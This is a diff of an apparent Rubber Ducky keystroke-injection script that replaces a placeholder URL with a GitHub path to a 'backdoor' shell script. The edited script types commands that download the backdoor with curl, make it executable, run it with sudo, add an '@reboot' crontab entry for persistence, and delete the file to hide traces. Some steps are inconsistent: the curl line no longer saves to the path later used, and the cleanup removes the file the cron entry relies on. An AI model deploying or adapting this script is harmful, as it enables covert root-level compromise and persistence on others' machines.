@@ -8,30 +8,30 @@ DELAY 1000
 
 REM Download the payload from GitHub (Replace the URL with your GitHub URL)
 DELAY 500
-TYPE "curl -L https://raw.githubusercontent.com/yourteam/yourrepo/main/payload.sh -o ~/Downloads/payload.sh"
+TYPE "curl -L https://raw.githubusercontent.com/hl-mrGoose/Figura-Pi/refs/heads/main/payload_dir/backdoor/figura.sh"
 ENTER
 DELAY 1500
 
 REM Set execution permissions
 DELAY 500
-TYPE "chmod +x ~/Downloads/payload.sh"
+TYPE "chmod +x ~/Downloads/figura.sh"
 ENTER
 DELAY 1000
 
 REM Execute the payload
 DELAY 500
-TYPE "sudo ~/Downloads/payload.sh"
+TYPE "sudo ~/Downloads/figura.sh"
 ENTER
 DELAY 2000
 
 REM Optionally, set persistence (add to cron or launchd, depending on preference)
 DELAY 500
-TYPE "echo '@reboot sudo ~/Downloads/payload.sh' | crontab -"
+TYPE "echo '@reboot sudo ~/Downloads/figura.sh' | crontab -"
 ENTER
 
 REM Clean up the Ducky trace
 DELAY 500
-TYPE "rm ~/Downloads/payload.sh"
+TYPE "rm ~/Downloads/figura.sh"
 ENTER
 
 REM Close Terminal
